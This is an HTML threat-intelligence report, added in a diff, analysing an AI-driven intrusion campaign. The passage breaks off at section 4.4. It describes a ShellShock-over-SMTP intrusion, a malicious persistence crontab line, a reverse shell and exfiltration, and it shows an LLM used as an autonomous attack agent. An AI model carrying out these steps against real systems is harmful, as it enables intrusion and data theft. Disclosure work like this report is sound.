@@ -1,1 +1,978 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Operation CAIRN: Technical Analysis of an Autonomous AI-Driven Intrusion Campaign | M3GATR0N</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --surface: #161b22;
+  --surface2: #21262d;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --red: #f85149;
+  --orange: #d29922;
+  --green: #3fb950;
+  --purple: #bc8cff;
+  --cyan: #39c5cf;
+  --yellow: #e3b341;
+}
+@media(prefers-color-scheme:light){
+  :root{
+    --bg:#f6f8fa;--surface:#fff;--surface2:#f0f2f5;--border:#d0d7de;
+    --text:#1f2328;--muted:#656d76;--accent:#0969da;--red:#cf222e;
+    --orange:#9a6700;--green:#1a7f37;--purple:#8250df;--cyan:#0969da;--yellow:#9a6700;
+  }
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif;font-size:14px;line-height:1.7;}
+.pub-banner{background:#0d2137;color:#58a6ff;text-align:center;padding:8px 16px;font-size:11px;font-weight:700;letter-spacing:1.5px;border-bottom:2px solid #58a6ff;}
+.header{background:var(--surface);border-bottom:1px solid var(--border);padding:36px 56px;}
+.tlp-bar{display:inline-block;background:rgba(248,81,73,.15);border:1px solid #f85149;color:#f85149;padding:2px 10px;border-radius:4px;font-size:11px;font-weight:700;letter-spacing:1px;margin-bottom:12px;}
+h1{font-size:24px;font-weight:700;color:var(--text);line-height:1.3;margin-bottom:8px;}
+h1 span.op{color:var(--red);}
+.subtitle{color:var(--muted);font-size:13px;margin-bottom:20px;}
+.meta-row{display:flex;flex-wrap:wrap;gap:24px;margin-top:16px;}
+.meta-item{font-size:12px;color:var(--muted);}
+.meta-item strong{color:var(--text);display:block;font-size:13px;}
+.container{max-width:1140px;margin:0 auto;padding:40px 24px;}
+
+h2{font-size:15px;font-weight:700;color:var(--accent);margin:48px 0 16px;padding-bottom:8px;border-bottom:2px solid var(--border);text-transform:uppercase;letter-spacing:1px;}
+h3{font-size:14px;font-weight:600;color:var(--yellow);margin:28px 0 12px;}
+h4{font-size:13px;font-weight:600;color:var(--cyan);margin:20px 0 8px;}
+p{margin-bottom:12px;color:var(--text);line-height:1.7;}
+
+.abstract{background:var(--surface);border:1px solid var(--border);border-left:4px solid var(--accent);padding:20px 24px;margin:20px 0;border-radius:4px;}
+.abstract p{margin:0;font-size:13px;line-height:1.8;color:var(--text);}
+
+.alert{padding:14px 18px;border-radius:6px;margin:16px 0;font-size:13px;}
+.alert-r{background:rgba(248,81,73,.1);border:1px solid rgba(248,81,73,.35);border-left:4px solid var(--red);}
+.alert-y{background:rgba(210,153,34,.1);border:1px solid rgba(210,153,34,.35);border-left:4px solid var(--orange);}
+.alert-g{background:rgba(63,185,80,.1);border:1px solid rgba(63,185,80,.35);border-left:4px solid var(--green);}
+
+pre,code{font-family:'SF Mono','Fira Code',Consolas,'Courier New',monospace;}
+pre{background:#010409;border:1px solid var(--border);border-radius:6px;padding:20px;overflow-x:auto;font-size:12px;line-height:1.6;margin:16px 0;white-space:pre-wrap;word-break:break-all;position:relative;}
+@media(prefers-color-scheme:light){pre{background:#f0f2f5;}}
+.pre-label{font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px;}
+code{background:var(--surface2);padding:2px 6px;border-radius:3px;font-size:12px;color:var(--cyan);}
+
+.findings-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:16px;margin:24px 0;}
+.find-card{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:18px;}
+.find-card.r{border-top:3px solid var(--red);}
+.find-card.o{border-top:3px solid var(--orange);}
+.find-card.y{border-top:3px solid var(--yellow);}
+.find-card.p{border-top:3px solid var(--purple);}
+.find-card.c{border-top:3px solid var(--cyan);}
+.find-card.g{border-top:3px solid var(--green);}
+.find-card .label{font-size:10px;color:var(--muted);font-weight:700;letter-spacing:.5px;text-transform:uppercase;margin-bottom:6px;}
+.find-card .num{font-size:32px;font-weight:700;line-height:1;margin-bottom:4px;}
+.find-card.r .num{color:var(--red);}
+.find-card.o .num{color:var(--orange);}
+.find-card.y .num{color:var(--yellow);}
+.find-card.p .num{color:var(--purple);}
+.find-card.c .num{color:var(--cyan);}
+.find-card.g .num{color:var(--green);}
+.find-card p{font-size:12px;color:var(--muted);margin:0;}
+
+table{width:100%;border-collapse:collapse;margin:16px 0;font-size:12px;}
+th{background:var(--surface2);padding:10px 14px;text-align:left;border:1px solid var(--border);color:var(--muted);font-weight:600;text-transform:uppercase;letter-spacing:.5px;font-size:11px;}
+td{padding:9px 14px;border:1px solid var(--border);vertical-align:top;line-height:1.5;}
+tr:nth-child(even) td{background:rgba(255,255,255,.02);}
+@media(prefers-color-scheme:light){tr:nth-child(even) td{background:rgba(0,0,0,.02);}}
+
+.badge{display:inline-block;padding:2px 8px;border-radius:12px;font-size:10px;font-weight:700;letter-spacing:.3px;}
+.b-red{background:rgba(248,81,73,.15);color:var(--red);}
+.b-orange{background:rgba(210,153,34,.15);color:var(--orange);}
+.b-green{background:rgba(63,185,80,.15);color:var(--green);}
+.b-cyan{background:rgba(57,197,207,.15);color:var(--cyan);}
+.b-muted{background:var(--surface2);color:var(--muted);}
+.b-purple{background:rgba(188,140,255,.15);color:var(--purple);}
+.b-yellow{background:rgba(227,179,65,.15);color:var(--yellow);}
+
+.timeline{border-left:2px solid var(--border);padding-left:28px;margin:16px 0;}
+.tl-item{margin-bottom:24px;position:relative;}
+.tl-item::before{content:'';width:10px;height:10px;border-radius:50%;position:absolute;left:-34px;top:4px;}
+.tl-item.c1::before{background:var(--cyan);}
+.tl-item.c2::before{background:var(--red);}
+.tl-item.c3::before{background:var(--orange);}
+.tl-item.c4::before{background:var(--purple);}
+.tl-item.c5::before{background:var(--green);}
+.tl-ts{font-size:11px;font-weight:700;color:var(--muted);margin-bottom:4px;font-family:monospace;}
+.tl-title{font-weight:600;font-size:13px;color:var(--text);margin-bottom:4px;}
+.tl-detail{font-size:12px;color:var(--muted);}
+
+.arch-diagram{background:#010409;border:1px solid var(--border);border-radius:6px;padding:24px;font-family:monospace;font-size:12px;line-height:1.6;overflow-x:auto;margin:16px 0;}
+@media(prefers-color-scheme:light){.arch-diagram{background:#f0f2f5;}}
+
+.victim-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:16px;margin:16px 0;}
+.victim-card{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:18px;}
+.victim-card .vs{font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px;}
+.victim-card .vt{font-weight:600;font-size:13px;margin-bottom:4px;}
+.victim-card .vr{font-size:12px;color:var(--green);font-weight:600;margin:4px 0;}
+.victim-card .vd{font-size:12px;color:var(--muted);line-height:1.6;}
+
+.toc{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:20px 28px;margin:28px 0;}
+.toc h3{margin:0 0 12px;font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;}
+.toc ol{padding-left:20px;}
+.toc li{padding:2px 0;font-size:13px;}
+.toc a{color:var(--accent);text-decoration:none;}
+.toc a:hover{text-decoration:underline;}
+
+.ioc-row{display:flex;gap:12px;padding:10px 0;border-bottom:1px solid var(--border);align-items:flex-start;}
+.ioc-row:last-child{border-bottom:none;}
+.ioc-type{font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;min-width:90px;flex-shrink:0;padding-top:2px;}
+.ioc-val{font-family:monospace;font-size:12px;color:var(--cyan);flex:1;word-break:break-all;}
+.ioc-desc{font-size:12px;color:var(--muted);min-width:220px;}
+.ioc-conf{min-width:80px;text-align:right;}
+
+.mitre-table td:first-child{font-family:monospace;color:var(--cyan);font-size:11px;white-space:nowrap;}
+
+.note{font-size:11px;color:var(--muted);font-style:italic;margin-top:4px;}
+hr.section{border:none;border-top:2px solid var(--border);margin:56px 0;}
+footer{background:var(--surface);border-top:1px solid var(--border);padding:24px 56px;font-size:11px;color:var(--muted);display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;margin-top:56px;}
+</style>
+</head>
+<body>
+
+<div class="pub-banner">INDEPENDENT SECURITY RESEARCH &mdash; PUBLIC DISCLOSURE &mdash; OPERATION CAIRN &mdash; @TheM3gatr0n &mdash; OCTOBER 2026</div>
+
+<div class="header">
+  <div class="tlp-bar">WITHHELD: Victim names</div>
+  <h1><span class="op">Operation CAIRN:</span> Technical Analysis of an Autonomous AI-Driven Intrusion Campaign</h1>
+  <div class="subtitle">Independent Security Research &middot; First Publication October 2026</div>
+  <div class="meta-row">
+    <div class="meta-item"><strong>Author</strong>M3GATR0N / @TheM3gatr0n</div>
+    <div class="meta-item"><strong>Published</strong>October 2026</div>
+    <div class="meta-item"><strong>Confidence</strong><span class="badge b-red">HIGH &mdash; Direct artefact recovery</span></div>
+    <div class="meta-item"><strong>Threat Status</strong><span class="badge b-red">ACTIVE AT DISCOVERY</span></div>
+    <div class="meta-item"><strong>Working Name</strong>UNC-CAIRN</div>
+  </div>
+</div>
+
+<div class="container">
+
+<div class="alert alert-r">
+  <strong>Disclosure Notice:</strong> Operator network indicators (IP addresses, ports, TLS certificate hashes) are included in full. Victim organisation names and credential material are withheld.
+</div>
+
+<div class="toc">
+  <h3>Contents</h3>
+  <ol>
+    <li><a href="#exec">Executive Summary</a></li>
+    <li><a href="#findings">Key Findings</a></li>
+    <li><a href="#timeline">Campaign Timeline</a></li>
+    <li><a href="#cairn">The Cairn Platform: Architecture and Capability</a></li>
+    <li><a href="#infra">Operator Infrastructure</a></li>
+    <li><a href="#victims">Victim Analysis</a></li>
+    <li><a href="#rce-smtp">Technical Deep Dive: ShellShock over SMTP (CVE-2014-6271)</a></li>
+    <li><a href="#redis-k8s">Technical Deep Dive: Kubernetes Redis Pod Compromise</a></li>
+    <li><a href="#mssql">Technical Deep Dive: MSSQL Credential Extraction Chain</a></li>
+    <li><a href="#privesc">Privilege Escalation: Four Rounds, All Blocked</a></li>
+    <li><a href="#cves">CVE Inventory</a></li>
+    <li><a href="#iocs">Indicators of Compromise</a></li>
+    <li><a href="#tools">Attacker Toolset</a></li>
+    <li><a href="#mitre">MITRE ATT&amp;CK Mapping</a></li>
+    <li><a href="#attribution">Attribution Assessment</a></li>
+    <li><a href="#artex">Comparison: UNC-CAIRN vs ARTEX (Zscaler, October 2026)</a></li>
+  </ol>
+</div>
+
+<h2 id="exec">1. Executive Summary</h2>
+
+<div class="abstract">
+<p>A Chinese-speaking threat actor has built and deployed a custom autonomous AI intrusion platform named Cairn, which selects targets, generates exploit chains, tracks failure states across sessions in a SQLite fact-graph, and iterates on blocked attack paths without sustained human involvement per session. Discovery resulted from routine investigation of a suspicious APAC-hosted VPS that was found serving an open staging directory on a non-standard port. The directory contained 150-plus active campaign artefacts including exploit tools, Chinese-language AI session logs, victim enumeration data, credential extracts, and platform management scripts.</p>
+<p>Evidence recovered from these artefacts reveals a campaign active from 24 September 2026 through at least 13 October 2026, targeting a minimum of 85 organisations across the United States, Taiwan, Europe, and the broader Asia-Pacific region. Four distinct victim environments were positively identified from recovered artefacts. A fifth was targeted but could not be identified. Confirmed stolen material includes payment card stream data, customer plaintext credentials, Magento admin tokens, GCP service account private keys, MSSQL database credentials, and detailed internal network topology of a Taiwanese enterprise messaging provider including the contents of a 2.35 GB mail relay Mailbox and a cluster of 10 SQL Server production nodes.</p>
+<p>The platform consumed 229,828 AI-dispatched attack sessions across 13 days, powered by two stolen Cline Pass subscriptions (combined ~$9,989 credit remaining at discovery) routing DeepSeek v4.1-flash through a pirated account rotation service. This report provides full technical analysis of the Cairn platform architecture, detailed walk-throughs of three confirmed intrusion chains sourced directly from recovered logs, an operator OPSEC assessment, and a comparison with the concurrent ARTEX campaign disclosed by Zscaler ThreatLabz.</p>
+</div>
+
+<h2 id="findings">2. Key Findings</h2>
+
+<div class="findings-grid">
+  <div class="find-card r">
+    <div class="label">Victim scope</div>
+    <div class="num">85+</div>
+    <p>Distinct target projects in operator database, active 24 Sep &ndash; 6 Oct 2026</p>
+  </div>
+  <div class="find-card o">
+    <div class="label">AI attack sessions</div>
+    <div class="num">229,828</div>
+    <p>Dispatcher log lines over 13 days; average 17,679 per day at campaign peak (25 Sep)</p>
+  </div>
+  <div class="find-card y">
+    <div class="label">Confirmed RCE</div>
+    <div class="num">1</div>
+    <p>Taiwanese bulk SMS/messaging infrastructure; full shell as vpopmail, 4 failed privilege escalation rounds</p>
+  </div>
+  <div class="find-card c">
+    <div class="label">Confirmed stolen</div>
+    <div class="num">6+</div>
+    <p>Credential categories: payment cards, customer creds, Magento tokens, GCP SA keys, MSSQL creds, internal network topology</p>
+  </div>
+  <div class="find-card p">
+    <div class="label">AI compute cost</div>
+    <div class="num">~$10K</div>
+    <p>Two stolen Cline Pass subscriptions funding DeepSeek API; operator maintained key rotation during active campaign</p>
+  </div>
+  <div class="find-card g">
+    <div class="label">Attack evidence preserved</div>
+    <div class="num">6.1 GB</div>
+    <p>4,813 MB attack evidence + 1,340 MB AI session records in operator containers, labelled &ldquo;do not delete&rdquo;</p>
+  </div>
+</div>
+
+<h2 id="timeline">3. Campaign Timeline</h2>
+
+<div class="timeline">
+
+  <div class="tl-item c1">
+    <div class="tl-ts">24 Sep 2026 &mdash; Campaign day 1</div>
+    <div class="tl-title">Campaign initialised. Dispatcher logs begin.</div>
+    <div class="tl-detail">18,293 log lines generated on day 1. 7 objective-completion events recorded. Network configuration script provisions primary and secondary operator IPs on target VPS. Crontab shows cairn_guard.sh and cairn_disk_guard.sh scheduled (every minute and every 15 minutes respectively). Docker image <code>oritera/cairn-worker-container</code> pulled. Bootstrap phase: 98 sessions.</div>
+  </div>
+
+  <div class="tl-item c1">
+    <div class="tl-ts">25 Sep 2026 &mdash; Campaign day 2 (peak)</div>
+    <div class="tl-title">Highest-volume day: 31,140 dispatcher events. 13 objectives completed.</div>
+    <div class="tl-detail">Magento e-commerce target active (proj_001). Internet conglomerate target active (proj_008). First ClinePass rate-limit exhaustion event. Key rotation via <code>fix_switcher.py</code> patching <code>/opt/cline-pass-switcher/server.js</code> to handle header-safe account names.</div>
+  </div>
+
+  <div class="tl-item c2">
+    <div class="tl-ts">29 Sep 2026 16:25 UTC</div>
+    <div class="tl-title">First confirmed ShellShock RCE on Taiwanese SMS infrastructure.</div>
+    <div class="tl-detail">SMTP transaction at 16:25:28 UTC delivers payload to mail2.[REDACTED]:25. Exfil listener receives first callback at 16:25:28 UTC from victim IP. SVN repository configuration extracted. vpopmail user identity confirmed. Callback from AWS address (3[.]89[.]199[.]21) received at 16:30:37 UTC via sibling listener, confirming out-of-band network path from victim infrastructure.</div>
+  </div>
+
+  <div class="tl-item c2">
+    <div class="tl-ts">29 Sep 2026 18:11&ndash;21:46 UTC</div>
+    <div class="tl-title">Sustained post-exploitation: full environment harvest over 5.5 hours.</div>
+    <div class="tl-detail">Systematic SMTP-channel execution of: id, hostname, uname, resolv.conf, ARP table, routing table, netstat, ps -ef, mount, df, service listing, process listing, SVN config, PHP config, Apache config, web directory tree, SUID binary search, sudo version check, Java process tree, MAIL2POST mailbox listing. All output exfiltrated as chunked PUT requests to operator HTTP capture listener. Mailbox file Mailbox.e2po_teamplus_com_tw confirmed at 2,525,207,109 bytes (2.35 GB).</div>
+  </div>
+
+  <div class="tl-item c3">
+    <div class="tl-ts">29 Sep 2026 20:58 UTC</div>
+    <div class="tl-title">MSSQL credential extraction confirmed.</div>
+    <div class="tl-detail">ShellShock channel used to read /opt/web.xml. Database credentials extracted in full. Operator downloads MssqlProbe.java from staging directory to victim server via curl. JTurbo.jar JDBC driver located in 25+ service directories. Internal host file reveals MSSQL cluster: 10 production nodes (entdb10p&ndash;80p) on 10.225.30.x, 5 GW database nodes (gwdb15p&ndash;55p), 1 operational node (opdb110p). ARP scan reveals 22-host LAN on 192.168.1.x/24.</div>
+  </div>
+
+  <div class="tl-item c3">
+    <div class="tl-ts">29 Sep 2026 18:29&ndash;19:00 UTC (approx.)</div>
+    <div class="tl-title">Privilege escalation: Round 1. Blocked.</div>
+    <div class="tl-detail">SUID binary enumeration, sudo -n id test, sudo -V (confirms 1.7.2p1), writable cron path check, getcap sweep. All blocked: no sudo rights for vpopmail, no writable cron directories, no exploitable SUID beyond standard binaries.</div>
+  </div>
+
+  <div class="tl-item c3">
+    <div class="tl-ts">29 Sep 2026 (18:51&ndash;53 UTC)</div>
+    <div class="tl-title">Privilege escalation: Rounds 2 and 3. Blocked.</div>
+    <div class="tl-detail">/etc/sudoers unreadable. sudo -n id returns no output. Kernel: Linux 2.6.18-371.el5xen (CentOS 5, 2013 compile). Although over 40 known local privilege escalation CVEs affect this kernel, the Xen virtualisation layer and the operator's failure to transfer a compiled exploit binary blocked all attempts.</div>
+  </div>
+
+  <div class="tl-item c3">
+    <div class="tl-ts">29 Sep 2026 (later)</div>
+    <div class="tl-title">Privilege escalation: Round 4. Blocked.</div>
+    <div class="tl-detail">Package enumeration for sudo, udev, kernel CVE changelog. Operator identifies multiple relevant CVEs (CVE-2013-1775, CVE-2009-1185). No compiled exploit delivered. Escalation chain terminated at vpopmail shell.</div>
+  </div>
+
+  <div class="tl-item c4">
+    <div class="tl-ts">24 Sep 2026 19:28 UTC</div>
+    <div class="tl-title">GCP Kubernetes Redis pod compromise confirmed.</div>
+    <div class="tl-detail">Reverse shell connects from GCP node 35[.]241[.]192[.]106 to operator listener on port 4446. Shell: Alpine Linux, uid=0(root). Pod identity confirmed. Crontab entry <code>*/5 * * * * /bin/sh /data/pwn.sh</code> confirmed. Redis AOF file at 174,520,757 bytes (174 MB). Environment variable sweep reveals 35+ tenant service addresses and names.</div>
+  </div>
+
+  <div class="tl-item c4">
+    <div class="tl-ts">4 Oct 2026</div>
+    <div class="tl-title">Second Raspberry Pi worker (pi-cline-deepseek) goes silent.</div>
+    <div class="tl-detail">Worker pi-cline-deepseek (8,472 tasks) last appears in dispatch logs on 4 October 2026. Cause unknown. First worker pi-workbuddy continues: 1,877 additional tasks dispatched 4&ndash;6 Oct. Azure VM at [REDACTED] continues pulling tasks remotely.</div>
+  </div>
+
+  <div class="tl-item c5">
+    <div class="tl-ts">6 Oct 2026</div>
+    <div class="tl-title">Dispatcher logs end. Campaign enters dormancy or operational security pause.</div>
+    <div class="tl-detail">Last log entry 6 Oct 2026: 6,040 lines. 51 total objective-completion events logged across 13 campaign days. Disk audit shows 98 GB data volume at 93% capacity. cairn_disk_guard.sh actively sweeping container temp directories.</div>
+  </div>
+
+  <div class="tl-item c5">
+    <div class="tl-ts">13 Oct 2026</div>
+    <div class="tl-title">Open staging directory accessed during routine infrastructure research. This report initiated.</div>
+    <div class="tl-detail">150-plus artefact files recovered. Full campaign scope identified. Four victim environments positively identified. Operator SSH credential found embedded in exploit script.</div>
+  </div>
+
+</div>
+
+<h2 id="cairn">4. The Cairn Platform: Architecture and Capability</h2>
+
+<h3>4.1 Overview</h3>
+<p>Cairn is a fully custom autonomous penetration/intrusion platform. It is not a modified or weaponised version of any known open-source pentest framework. Its architecture separates concerns cleanly: a dispatcher process manages project scheduling and worker allocation; Docker containers provide per-victim isolation (one Kali Linux container per project); a local API server exposes the project and intent state to workers; an LLM proxy handles AI inference via stolen subscriptions; and per-session Chinese-language summaries create a persistent institutional memory that carries forward across the 128,000-token context window.</p>
+
+<div class="arch-diagram">
+<pre style="background:transparent;border:none;padding:0;margin:0;">
+&#9484;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9488;
+&#9474; CAIRN PLATFORM                                                           &#9474;
+&#9474;                                                                           &#9474;
+&#9474;  &#9484;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9488;   &#9484;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9488;  &#9474;
+&#9474;  &#9474; Dispatcher     &#9474;   &#9474; cairn.db (SQLite)                        &#9474;  &#9474;
+&#9474;  &#9474; /opt/cairn/     &#9474;&#9472;&#9472;&#9492;&#9472; projects  | intents | facts           &#9474;  &#9474;
+&#9474;  &#9474; dispatch.log    &#9474;   &#9474; workers   | hints   | intent_sources  &#9474;  &#9474;
+&#9474;  &#9492;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9524;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9488;   &#9492;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9488;  &#9474;
+&#9474;          &#9474;                                                           &#9474;
+&#9474;          &#9474;   &#9484;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9488;  &#9484;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9488;  &#9474;
+&#9474;          &#9492;&#9472;&#9472;&#9492;&#9472; Cairn API      &#9474;  &#9474; LLM Proxy            &#9474;  &#9474;
+&#9474;              &#9474; uvicorn :8000  &#9474;&#9472;&#9472;&#9492;&#9472; 127.0.0.1:3123       &#9474;  &#9474;
+&#9474;              &#9474; Basic auth     &#9474;  &#9474; ClinePass rotation   &#9474;  &#9474;
+&#9474;              &#9492;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9524;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9488;  &#9474; DeepSeek v4.1-flash &#9474;  &#9474;
+&#9474;                       &#9474;          &#9492;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9488;  &#9474;
+&#9474;                       &#9474;                                           &#9474;
+&#9474;       &#9484;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9524;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9488;   &#9474;
+&#9474;       &#9474;          &#9474;                         &#9474;   &#9474;
+&#9474;  &#9484;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9516;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9488; &#9484;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9516;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9488; &#9484;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9488;  &#9474;
+&#9474;  &#9474; pi-workbuddy &#9474; &#9474; pi-cline-  &#9474; &#9474; Azure VM (remote)&#9474;  &#9474;
+&#9474;  &#9474; 9,394 tasks  &#9474; &#9474; deepseek   &#9474; &#9474; pulls via API     &#9474;  &#9474;
+&#9474;  &#9474; Raspberry Pi &#9474; &#9474; 8,472 tasks&#9474; &#9474; 27K+ log hits     &#9474;  &#9474;
+&#9474;  &#9492;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9488; &#9492;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9488; &#9492;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9488;  &#9474;
+&#9474;                                                                           &#9474;
+&#9474;  Docker containers (1 per victim project):                                &#9474;
+&#9474;  cairn-dispatch-proj_XXX  /tmp/out (attack evidence, 4,813 MB total)       &#9474;
+&#9474;  cairn-chat-proj_XXX      /tmp/cairn-pi (session records, 1,340 MB total)  &#9474;
+&#9492;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9496;
+</pre>
+</div>
+
+<h3>4.2 The AI Attack Loop</h3>
+<p>Each Cairn attack session follows a structured reasoning loop. The dispatcher reads the SQLite database to find projects with open intents and available workers, selects a worker, and issues the task. Inside the Docker container, the LLM receives the target&rsquo;s fact-graph (<code>graph.yaml</code>), a goal statement, and a Chinese-language summary of all prior sessions. It selects the next intent (attack step), the container executes it, and the result is written back to the fact-graph. Sessions that cannot advance the graph are marked as failing; the dispatcher tries a different angle on the next cycle.</p>
+
+<div class="pre-label">Dispatch statistics &mdash; recovered from dispatch_stats.json</div>
+<pre>
+{
+  "log_total_lines": 229828,        // individual dispatcher events across campaign
+  "first_day": "2026-09-24",
+  "last_day":  "2026-10-06",
+
+  "dispatched_by_phase": {
+    "explore":   17768,             // active exploit-phase attack dispatches
+    "bootstrap": 98                 // initial target reconnaissance
+  },
+
+  "exec_by_phase": {
+    "explore_execute":  17762,
+    "explore_conclude": 16478,      // AI summarises each session
+    "reason_execute":   15119,      // AI selects next attack step
+    "bootstrap":        98,
+    "bootstrap_conclude": 65
+  },
+
+  "task_finished": {
+    "explore:failed":   9476,       // failed attack steps (surface tested, blocked)
+    "reason:failed":    7948,
+    "bootstrap:failed": 13,
+    "explore:rejected": 3
+  },
+
+  "completed_events": 51,           // successful objective completions
+
+  "top_projects_by_dispatch": {
+    "proj_035": 2049,               // highest-effort target (unidentified)
+    "proj_012": 1382,
+    "proj_033": 1196,
+    "proj_074":  972,
+    "proj_062":  964,
+    "proj_008":  615,               // Internet conglomerate / digital health
+    "proj_001":  550                // consumer e-commerce
+  }
+}
+</pre>
+
+<h3>4.3 AI Session Notes (Simplified Chinese)</h3>
+<p>Every session concludes with a structured Chinese-language summary written by the LLM, fed back into the next session as context. These notes track confirmed facts, blocked paths, and recommended next steps with clinical precision. The following is a translated excerpt from the attack against a consumer e-commerce Magento target, documenting the AI reasoning after a failed Microsoft OAuth2 credential exploitation attempt:</p>
+
+<div class="pre-label">AI session conclusion note &mdash; proj_001, translated from Simplified Chinese</div>
+<pre>
+Original (Simplified Chinese):
+  邮件通道方向结论：目标 [REDACTED] 的 Microsoft OAuth2 敏感凭据
+  为 Magento Encryptor 加密密文，在无 FILE 权限、无 crypt key 的条件下
+  无法解密/复用，『明文凭据→兑换 access_token→接管 [REDACTED] 邮箱
+  →拦截管理员口令重置』链被彻底阻断
+
+Translation:
+  Mail channel direction conclusion: Target [REDACTED] Microsoft OAuth2 sensitive
+  credentials are Magento Encryptor ciphertext. Without FILE permissions or the
+  crypt key, decryption is impossible. The chain:
+    [plaintext credential]
+      → exchange access_token
+      → take over [REDACTED] mailbox
+      → intercept administrator password reset
+  is completely blocked. This attack path is abandoned.
+</pre>
+
+<p>This represents a fundamental shift in adversarial tradecraft. Rather than a human analyst reviewing failure logs and manually pivoting, the AI maintains a structured reasoning chain across sessions and decides autonomously when to abandon a path and which alternative to attempt next.</p>
+
+<h3>4.4 ClinePass Subscription Abuse</h3>
